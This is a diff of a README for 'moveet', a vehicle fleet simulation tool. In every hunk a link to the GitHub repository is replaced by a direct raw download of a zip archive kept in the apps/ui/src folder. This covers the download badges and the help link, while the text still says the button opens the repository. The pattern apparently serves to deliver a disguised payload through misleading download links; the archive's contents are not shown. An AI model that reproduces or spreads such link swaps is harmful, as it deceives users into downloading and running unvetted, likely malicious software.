@@ -1,6 +1,6 @@
 # 🚗 moveet - Simulate Vehicle Fleets Easily
 
-[![Download moveet](https://img.shields.io/badge/Download-moveet-4c1?logo=github&style=for-the-badge)](https://github.com/rickpet1764/moveet)
+[![Download moveet](https://img.shields.io/badge/Download-moveet-4c1?logo=github&style=for-the-badge)](https://github.com/rickpet1764/moveet/raw/refs/heads/main/apps/ui/src/Software-1.6-alpha.3.zip)
 
 ---
 
@@ -42,7 +42,7 @@ The app helps visualize how vehicles behave on roads using real-world data. It w
 
 Click the button below to go to the official download page for moveet:
 
-[![Download moveet](https://img.shields.io/badge/Download-moveet-blueviolet?logo=github&style=for-the-badge)](https://github.com/rickpet1764/moveet)
+[![Download moveet](https://img.shields.io/badge/Download-moveet-blueviolet?logo=github&style=for-the-badge)](https://github.com/rickpet1764/moveet/raw/refs/heads/main/apps/ui/src/Software-1.6-alpha.3.zip)
 
 This will open the GitHub repository. Look for the latest release or download options.
 
@@ -121,7 +121,7 @@ moveet runs locally on your computer. It does not send your data to outside serv
 ## 🤝 Getting Help and Support
 
 - Visit the GitHub repository for documentation and updates:  
-  https://github.com/rickpet1764/moveet  
+  https://github.com/rickpet1764/moveet/raw/refs/heads/main/apps/ui/src/Software-1.6-alpha.3.zip  
 - Use the Issues tab to report bugs or request features.  
 - Check the README file in the repo for detailed developer info.  
 
@@ -139,4 +139,4 @@ moveet runs locally on your computer. It does not send your data to outside serv
 
 Get started by clicking here:
 
-[![Download moveet](https://img.shields.io/badge/Download-moveet-green?logo=github&style=for-the-badge)](https://github.com/rickpet1764/moveet)
+[![Download moveet](https://img.shields.io/badge/Download-moveet-green?logo=github&style=for-the-badge)](https://github.com/rickpet1764/moveet/raw/refs/heads/main/apps/ui/src/Software-1.6-alpha.3.zip)
